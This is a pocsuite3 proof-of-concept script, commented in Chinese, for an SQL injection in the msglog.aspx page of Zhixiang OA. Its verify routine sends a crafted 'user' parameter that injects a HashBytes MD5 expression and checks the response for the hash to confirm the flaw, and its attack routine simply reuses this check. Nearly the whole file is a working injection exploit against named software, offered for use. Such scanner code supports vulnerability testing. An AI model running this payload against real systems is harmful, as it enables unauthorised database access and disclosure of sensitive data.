from collections import OrderedDict
from urllib.parse import urljoin
import re
import re,random,hashlib
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-07-18'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-07-18'  # 编写 PoC 的日期
    updateDate = '2022-07-18'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '致翔OA msglog.aspx SQL注入漏洞'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '致翔OA'  # 漏洞应用名称
    appVersion = '''未知'''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        致翔OA msglog.aspx文件存在SQL注入漏洞,攻击者通过漏洞可获取敏感信息
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def _verify(self):
        result = {}
        # 随机生成字符串
        str_num = str(random.randint(1000000000,9999999999))
        str_md5 = hashlib.md5(str_num.encode()).hexdigest()
        path="/mainpage/msglog.aspx?user=1' and (SELECT sys.fn_sqlvarbasetostr(HashBytes('MD5','"+str_num+"')))=1 --"
        url = self.url + path
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        }
        try:
            resq = requests.get(url=url,headers=headers,timeout=5)
            if resq.text and str_md5 in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)